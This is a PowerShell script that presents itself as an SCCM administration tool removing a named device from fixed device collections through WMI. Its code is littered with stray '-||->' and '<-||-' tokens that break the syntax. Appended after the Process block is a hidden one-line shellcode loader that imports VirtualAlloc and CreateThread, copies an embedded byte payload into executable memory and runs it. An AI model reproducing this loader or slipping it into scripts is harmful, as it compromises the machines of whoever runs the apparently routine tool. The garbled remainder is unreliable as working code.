
[CmdletBinding(SupportsShouldProcess=$true)]
param(
    [parameter(Mandatory=$true, HelpMessage="Site server name with SMS Provider installed")]
    [ValidateNotNullorEmpty()]
    [string]$SiteServer,
    [parameter(Mandatory=$true, HelpMessage="Name of the device that will be removed from any specified device collections")]
    [ValidateNotNullorEmpty()]
    [string]$DeviceName
)
Begin {
    
     -||-> try {
         -||-> Write-Verbose "Determining SiteCode for Site Server: '$( -||-> $SiteServer <-||- )'" <-||- 
         -||-> $SiteCodeObjects =  -||-> Get-WmiObject -Namespace "root\SMS" -Class SMS_ProviderLocation -ComputerName $SiteServer -ErrorAction Stop <-||-  <-||- 
         -||-> foreach ($SiteCodeObject in  -||-> $SiteCodeObjects <-||- ) {
             -||-> if ( -||-> $SiteCodeObject.ProviderForLocalSite -eq $true <-||- ) {
                 -||-> $SiteCode = $SiteCodeObject.SiteCode <-||- 
                 -||-> Write-Debug "SiteCode: $( -||-> $SiteCode <-||- )" <-||- 
            } <-||- 
        } <-||- 
    }
    catch [System.UnauthorizedAccessException] {
         -||-> Write-Warning -Message "Access denied" <-||-  ; break
    }
    catch [System.Exception] {
         -||-> Write-Warning -Message $_.Exception.Message <-||-  ; break
    } <-||- 
}
Process {
    
     -||-> function Write-LogFile {
        param(
            [parameter(Mandatory=$true, HelpMessage="Name of the log file, e.g. 'FileName'. File extension should not be specified")]
            [ValidateNotNullOrEmpty()]
            [string]$Name,
            [parameter(Mandatory=$true, HelpMessage="Value added to the specified log file")]
            [ValidateNotNullOrEmpty()]
            [string]$Value,
            [parameter(Mandatory=$true, HelpMessage="Choose a location where the log file will be created")]
            [ValidateNotNullOrEmpty()]
            [ValidateSet("UserTemp","WindowsTemp")]
            [string]$Location
        )
        
        switch ( -||-> $Location <-||- ) {
            "UserTemp" {  -||-> $LogLocation = ( -||-> $env:TEMP + "\" <-||- ) <-||-  }
            "WindowsTemp" {  -||-> $LogLocation = ( -||-> $env:SystemRoot + "\Temp\" <-||- ) <-||-  }
        }
        
         -||-> $LogFile = ( -||-> $LogLocation + $Name + ".log" <-||- ) <-||- 
        
         -||-> if ( -||-> -not( -||-> Test-Path -Path $LogFile -PathType Leaf <-||- ) <-||- ) {
             -||-> New-Item -Path $LogFile -ItemType File -Force | Out-Null <-||- 
        } <-||- 
        
         -||-> Add-Content -Value $Value -LiteralPath $LogFile -Force <-||- 
    } <-||- 

    
     -||-> Write-LogFile -Name "RemoveDeviceFromCollection" -Location WindowsTemp -Value "Determine ResourceID for DeviceName: $( -||-> $DeviceName <-||- )" <-||- 
     -||-> $ResourceIDs =  -||-> Get-WmiObject -Namespace "root\SMS\site_$( -||-> $SiteCode <-||- )" -Class SMS_R_System -Filter "Name like '$( -||-> $DeviceName <-||- )'" | Select-Object -ExpandProperty ResourceID <-||-  <-||- 
     -||-> foreach ($ResourceID in  -||-> $ResourceIDs <-||- ) {
         -||-> Write-LogFile -Name "RemoveDeviceFromCollection" -Location WindowsTemp -Value "ResourceID: $( -||-> $ResourceID <-||- )" <-||- 
        
         -||-> $CollectionIDList =  -||-> New-Object -TypeName System.Collections.ArrayList <-||-  <-||- 
        
         -||-> $CollectionIDList.AddRange(@( -||-> "PS100052","PS1000A8","PS1000A1","PS100053" <-||- )) <-||- 
         -||-> foreach ($CollectionID in  -||-> $CollectionIDList <-||- ) {
             -||-> $Collection =  -||-> Get-WmiObject -Namespace "root\SMS\site_$( -||-> $SiteCode <-||- )" -Class SMS_Collection -Filter "CollectionID like '$( -||-> $CollectionID <-||- )'" <-||-  <-||- 
             -||-> $Collection.Get() <-||- 
             -||-> foreach ($CollectionRule in  -||-> $Collection.CollectionRules <-||- ) {
                
                 -||-> if ( -||-> $CollectionRule.ResourceID -like $ResourceID <-||- ) {
                     -||-> Write-LogFile -Name "RemoveDeviceFromCollection" -Location WindowsTemp -Value "Removing '$( -||-> $DeviceName <-||- )' from '$( -||-> $Collection.Name <-||- )" <-||- 
                     -||-> $Collection.DeleteMembershipRule($CollectionRule) <-||- 
                } <-||- 
            } <-||- 
        } <-||- 
    } <-||- 
}
$ra2 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $ra2 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xe9,0xd9,0x74,0x24,0xf4,0x58,0x33,0xc9,0xb1,0x47,0xbb,0x02,0xd5,0x78,0x31,0x31,0x58,0x18,0x03,0x58,0x18,0x83,0xc0,0x06,0x37,0x8d,0xcd,0xee,0x35,0x6e,0x2e,0xee,0x59,0xe6,0xcb,0xdf,0x59,0x9c,0x98,0x4f,0x6a,0xd6,0xcd,0x63,0x01,0xba,0xe5,0xf0,0x67,0x13,0x09,0xb1,0xc2,0x45,0x24,0x42,0x7e,0xb5,0x27,0xc0,0x7d,0xea,0x87,0xf9,0x4d,0xff,0xc6,0x3e,0xb3,0xf2,0x9b,0x97,0xbf,0xa1,0x0b,0x9c,0x8a,0x79,0xa7,0xee,0x1b,0xfa,0x54,0xa6,0x1a,0x2b,0xcb,0xbd,0x44,0xeb,0xed,0x12,0xfd,0xa2,0xf5,0x77,0x38,0x7c,0x8d,0x43,0xb6,0x7f,0x47,0x9a,0x37,0xd3,0xa6,0x13,0xca,0x2d,0xee,0x93,0x35,0x58,0x06,0xe0,0xc8,0x5b,0xdd,0x9b,0x16,0xe9,0xc6,0x3b,0xdc,0x49,0x23,0xba,0x31,0x0f,0xa0,0xb0,0xfe,0x5b,0xee,0xd4,0x01,0x8f,0x84,0xe0,0x8a,0x2e,0x4b,0x61,0xc8,0x14,0x4f,0x2a,0x8a,0x35,0xd6,0x96,0x7d,0x49,0x08,0x79,0x21,0xef,0x42,0x97,0x36,0x82,0x08,0xff,0xfb,0xaf,0xb2,0xff,0x93,0xb8,0xc1,0xcd,0x3c,0x13,0x4e,0x7d,0xb4,0xbd,0x89,0x82,0xef,0x7a,0x05,0x7d,0x10,0x7b,0x0f,0xb9,0x44,0x2b,0x27,0x68,0xe5,0xa0,0xb7,0x95,0x30,0x66,0xe8,0x39,0xeb,0xc7,0x58,0xf9,0x5b,0xa0,0xb2,0xf6,0x84,0xd0,0xbc,0xdd,0xac,0x7b,0x46,0xb5,0x12,0xd3,0x7f,0x88,0xfb,0x26,0x80,0x03,0xa0,0xaf,0x66,0x49,0x48,0xe6,0x31,0xe5,0xf1,0xa3,0xca,0x94,0xfe,0x79,0xb7,0x96,0x75,0x8e,0x47,0x58,0x7e,0xfb,0x5b,0x0c,0x8e,0xb6,0x06,0x9a,0x91,0x6c,0x2c,0x22,0x04,0x8b,0xe7,0x75,0xb0,0x91,0xde,0xb1,0x1f,0x69,0x35,0xca,0x96,0xff,0xf6,0xa4,0xd6,0xef,0xf6,0x34,0x81,0x65,0xf7,0x5c,0x75,0xde,0xa4,0x79,0x7a,0xcb,0xd8,0xd2,0xef,0xf4,0x88,0x87,0xb8,0x9c,0x36,0xfe,0x8f,0x02,0xc8,0xd5,0x11,0x7e,0x1f,0x13,0x64,0x6e,0xa3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$rmy=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($rmy.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$rmy,0,0,0);for (;;){Start-sleep 60};



